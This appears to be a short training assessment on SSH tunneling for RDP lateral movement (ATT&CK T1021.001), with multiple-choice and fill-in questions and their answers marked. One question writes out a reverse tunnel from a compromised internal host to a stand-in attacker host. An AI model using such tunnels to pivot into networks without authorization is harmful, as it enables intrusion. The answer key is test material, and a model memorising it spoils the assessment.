# T1021.001 – RDP SSH Tunneling | Assessment

## MCQ 1
`ssh -L 13389:target:3389 jump@pivot` creates:
A) A reverse tunnel from target to attacker  B) A local port forward: connections to localhost:13389 are forwarded through jump to target:3389  ✅
C) A VPN tunnel  D) A SOCKS proxy on port 13389

## MCQ 2
`ssh -D 1080 user@pivot` creates a dynamic SOCKS proxy that:
A) Forwards only port 1080  B) Routes all TCP connections through the SSH tunnel to the pivot host's network  ✅
C) Encrypts local disk  D) Creates a reverse shell on port 1080

## MCQ 3
`ssh -R 13389:internal_rdp:3389 attacker@attacker.com` is used for:
A) Local port forwarding  B) Reverse tunneling — the compromised internal host exposes an internal service to the external attacker  ✅
C) Dynamic SOCKS proxy  D) SSH key exchange

## Fill 1
SSH flag for a local port forward:
**Answer:** `-L [local_port]:[remote_host]:[remote_port]`

## Fill 2
proxychains configuration directive to route through SOCKS5 on localhost:1080:
**Answer:** `socks5 127.0.0.1 1080`
